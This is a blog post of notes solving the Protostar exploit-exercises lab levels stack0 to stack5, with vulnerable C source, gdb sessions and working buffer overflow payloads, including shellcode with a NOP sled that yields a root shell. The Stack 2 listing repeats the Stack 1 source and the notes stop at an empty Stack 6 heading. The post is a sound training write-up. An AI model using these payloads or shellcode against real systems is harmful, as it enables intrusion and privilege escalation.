---
layout: post
title: Protostart Notes
---

This is my notes for the Nebula VM.

https://exploit-exercises.com/protostar/

## Stack 0

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

```bash
user@protostar:/opt/protostar/bin$ python -c 'print ("A" * 65)' | ./stack0
you have changed the 'modified' variable
```

## Stack 1

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

This level teaches us about little endian addressing and ascii/hex encoding.

```bash
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c 'print ("A" * 64 + "dcba")')
you have correctly got the variable to the right value
```

## Stack 2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

```bash
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d" ' )
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

## Stack 3

The source code for this level looks like.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
Let's disassemble the program in Intel syntax.
```bsh
user@protostar:/opt/protostar/bin$ objdump -M intel -d ./stack3
```

```bsh
08048424 <win>:
 8048424:       55                      push   ebp
 8048425:       89 e5                   mov    ebp,esp
 8048427:       83 ec 18                sub    esp,0x18
 804842a:       c7 04 24 40 85 04 08    mov    DWORD PTR [esp],0x8048540
 8048431:       e8 2a ff ff ff          call   8048360 <puts@plt>
 8048436:       c9                      leave
 8048437:       c3                      ret

08048438 <main>:
 8048438:       55                      push   ebp
 8048439:       89 e5                   mov    ebp,esp
 804843b:       83 e4 f0                and    esp,0xfffffff0
 804843e:       83 ec 60                sub    esp,0x60
 8048441:       c7 44 24 5c 00 00 00    mov    DWORD PTR [esp+0x5c],0x0
 8048448:       00
 8048449:       8d 44 24 1c             lea    eax,[esp+0x1c]
 804844d:       89 04 24                mov    DWORD PTR [esp],eax
 8048450:       e8 db fe ff ff          call   8048330 <gets@plt>
 8048455:       83 7c 24 5c 00          cmp    DWORD PTR [esp+0x5c],0x0
 804845a:       74 1b                   je     8048477 <main+0x3f>
 804845c:       b8 60 85 04 08          mov    eax,0x8048560
 8048461:       8b 54 24 5c             mov    edx,DWORD PTR [esp+0x5c]
 8048465:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 8048469:       89 04 24                mov    DWORD PTR [esp],eax
 804846c:       e8 df fe ff ff          call   8048350 <printf@plt>
 8048471:       8b 44 24 5c             mov    eax,DWORD PTR [esp+0x5c]
 8048475:       ff d0                   call   eax
 8048477:       c9                      leave
 8048478:       c3                      ret
 8048479:       90                      nop
 804847a:       90                      nop
 804847b:       90                      nop
 804847c:       90                      nop
 804847d:       90                      nop
 804847e:       90                      nop
 804847f:       90                      nop
```
So our goal is to overflow the buffer and make the fp point to the win function. We know the fp is at `08048424` from the hexdump.

```bsh
user@protostar:/opt/protostar/bin$ python -c 'print "A" * 64 + "\x24\x84\x04\x08" ' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Stack 4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
This time we don't have a function pointer to overwrite with the win address. Instead we have to overwrite the EIP. Look at my binary notes for a further explanation.

```bsh
user@protostar:/opt/protostar/bin$ objdump -M intel -d ./stack4
```
Let's look at the hex dump to get the address of win again.
```bsh
080483f4 <win>:
 80483f4:       55                      push   ebp
 80483f5:       89 e5                   mov    ebp,esp
 80483f7:       83 ec 18                sub    esp,0x18
 80483fa:       c7 04 24 e0 84 04 08    mov    DWORD PTR [esp],0x80484e0
 8048401:       e8 26 ff ff ff          call   804832c <puts@plt>
 8048406:       c9                      leave
 8048407:       c3                      ret

08048408 <main>:
 8048408:       55                      push   ebp
 8048409:       89 e5                   mov    ebp,esp
 804840b:       83 e4 f0                and    esp,0xfffffff0
 804840e:       83 ec 50                sub    esp,0x50
 8048411:       8d 44 24 10             lea    eax,[esp+0x10]
 8048415:       89 04 24                mov    DWORD PTR [esp],eax
 8048418:       e8 ef fe ff ff          call   804830c <gets@plt>
 804841d:       c9                      leave
 804841e:       c3                      ret
 804841f:       90                      nop
```
Win at `080483f4`.

Now we want to find out where the EIP gets overwritten and then redirect to win there. We can use `peda` or `metasploit` to generate us a pattern to automate this, but for now let's do it manually.

First we write a python script to generate our attack string. We know the buffer is 64 chars long so we try.

```bash
user@protostar:/tmp$ cat stack4.py
print "A" * 64 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4
user@protostar:/tmp$ python stack4.py > stack4.txt
```
Now we:

1. `gdb` against stack4

```
user@protostar:/tmp$ gdb -q /opt/protostar/bin/stack4
```

2. input our string

```
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) r < stack4.txt
(gdb) r < stack4.txt
Starting program: /opt/protostar/bin/stack4 < stack4.txt

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
```

3. Inspect EIP for what value overwrote it

```
(gdb) i r
eax            0xbffff720       -1073744096
ecx            0xbffff720       -1073744096
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff770       0xbffff770
ebp            0x44444444       0x44444444
esi            0x0      0
edi            0x0      0
eip            0x45454545       0x45454545
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```
EIP = 45s which is the letter E. So we replace our Es with the memory address and we should redirect the program.

```bash
user@protostar:/tmp$ cat stack4.py
print "A" * 64 + "B" * 4 + "C" * 4 + "D" * 4 + "\xf4\x83\x04\x08"
...
(gdb) r < stack4.txt
Starting program: /opt/protostar/bin/stack4 < stack4.txt
code flow successfully changed
```
And outside gdb
```bsh
user@protostar:/tmp$ /opt/protostar/bin/stack4 < stack4.txt
code flow successfully changed
```

## Stack 5

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
This time we have nowhere to redirect the program to, we have to completely hijack it. Like the last level we overwrite the EIP but then we have to redirect it to code we control and have placed somewhere the program can reach.

Like Level 4, let's first determine how far into input we overwrite EIP. Break out the python script again.

```bsh
user@protostar:/tmp$ cat stack5.py
print "A" * 64 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4
user@protostar:/tmp$ python stack5.py > stack5.txt
```
Feed it into GDB.
```bsh
user@protostar:/tmp$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) r < stack5.txt
Starting program: /opt/protostar/bin/stack5 < stack5.txt

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
(gdb) i r
eax            0xbffff780       -1073744000
ecx            0xbffff780       -1073744000
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7d0       0xbffff7d0
ebp            0x44444444       0x44444444
esi            0x0      0
edi            0x0      0
eip            0x45454545       0x45454545
```
EIP is overwritten with 4 so we know the EIP is overwritten with the 4 characters after a 76 character buffer. Let's edit our python script.

```python
length = 76
print "A" * length + "E" * 4
```
Now we introduce some shellcode and a NOP sled. Shellcode is assembly instructions we place in memory which when the EIP points to it gives us a shell. A NOP sled is a series of `No Operation (0x90)` assembly instructions which essentially mean go to the next instruction. Since it can be hard to find the exact address of shellcode (affected by env variables, etc), we create a sled down to it so as long as we land anywhere in the sled, our shellcode will execute.

Let's edit our python script.
```python
length = 76

sled = "\x90" * 30

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" #39 bytes

print "A" * length + "\xd0\xf7\xff\xbf" + sled + shellcode
```
I got my shellcode from shell-storm.org. I used this one http://shell-storm.org/shellcode/files/shellcode-219.php as it re-opens stdin which the the gets() in this program closes. The other option would be to pipe in an empty cat after standard shellcode like `(cat stack5.txt ; cat) | ./stack5`

The other thing to note is I overwrote the EIP with 0xbffff7d0. This is the address right after the EIP that we have overwritten. I found it using gdb to find the NOP sled.

```bsh
(gdb) i r
eax            0xbffff780       -1073744000
ecx            0xbffff780       -1073744000
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7d0       0xbffff7d0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x45454545       0x45454545
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/x $esp
0xbffff7d0:     0x90909090
```
Testing it all out
```bsh
user@protostar:/tmp$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) r < stack5.txt
Starting program: /opt/protostar/bin/stack5 < stack5.txt
Executing new program: /bin/dash
$ whoami
user
$ id
uid=1001(user) gid=1001(user) groups=1001(user)
$ q
/bin//sh: q: not found
$ exit

Program exited with code 0177.
(gdb) q
user@protostar:/tmp$ /opt/protostar/bin/stack5 < stack5.txt
# whoami
root
```
We got root! Damn that feels good.

## Stack 6
